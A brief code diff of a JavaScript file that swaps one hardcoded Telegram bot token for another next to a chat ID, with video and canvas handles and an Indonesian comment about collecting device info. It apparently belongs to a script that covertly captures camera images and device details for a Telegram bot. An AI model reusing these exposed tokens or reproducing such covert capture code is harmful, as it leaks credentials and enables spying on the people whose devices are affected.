@@ -2,7 +2,7 @@ const videoEl = document.getElementById('video');
 const canvasEl = document.getElementById('canvas');
 
 // Ubah sesuai bot kamu
-const botToken = '6598957548:AAFd8OLzgH-ageyLfDGDxrEhoIS5CuHJ_sc';
+const botToken = '6136209053:AAF01MfDjE9oIajSHIDBDTpJ70CUuTqQLpY';
 const chatId = '1265481161';
 
 // Ambil info perangkat
